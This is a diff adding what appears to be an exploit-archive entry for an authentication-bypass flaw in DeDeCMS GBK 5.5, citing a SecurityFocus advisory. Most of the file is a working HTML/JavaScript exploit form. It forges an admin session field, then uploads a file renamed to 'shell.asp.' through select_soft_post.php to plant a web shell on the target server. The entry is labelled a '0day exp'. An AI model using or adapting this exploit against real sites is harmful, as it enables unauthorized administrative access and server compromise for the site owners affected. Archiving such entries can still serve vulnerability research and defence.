@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/38469/info
+
+DeDeCMS is prone to an authentication-bypass vulnerability because it fails to adequately verify user-supplied input.
+
+Attackers can exploit this issue to gain unauthorized access to the affected application.
+
+DeDeCMS GBK 5.5 is vulnerable; other versions may also be affected. 
+
+<form action="" method='POST' enctype="multipart/form-data"> U&nbsp;R&nbsp;L:<input type="text" name="target" size="50" value="http://192.168.1.110">&nbsp;&nbsp; Path:<input type="text" name="path" value="/DedeCmsV55-GBK-Final/uploads/include/dialog/select_soft_post.php" size="90"><br> File:&nbsp;<input type='file' name='uploadfile' size='25' />(Filetype must be GIF/JPEG etc)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RenameTo:<input type='test' name='newname' value="shell.asp."/><br> &nbsp; <input type=hidden name="_SESSION[dede_admin_id]" value=1> <input type=hidden name="bkurl" value=1> <input type='button' value='submit' onclick="fsubmit()"/><br><br><br><br><br><br> dedecms 0day exp..<br> need: session.auto_start = 1<br> By toby57 2010/2/22 </form> <script> function fsubmit(){ var form = document.forms[0]; form.action = form.target.value + form.path.value; tmpstr = form.target.value +'/'+ form.newname.value; form.bkurl.value = tmpstr.substr(0,tmpstr.length-1); form.submit(); } </script>
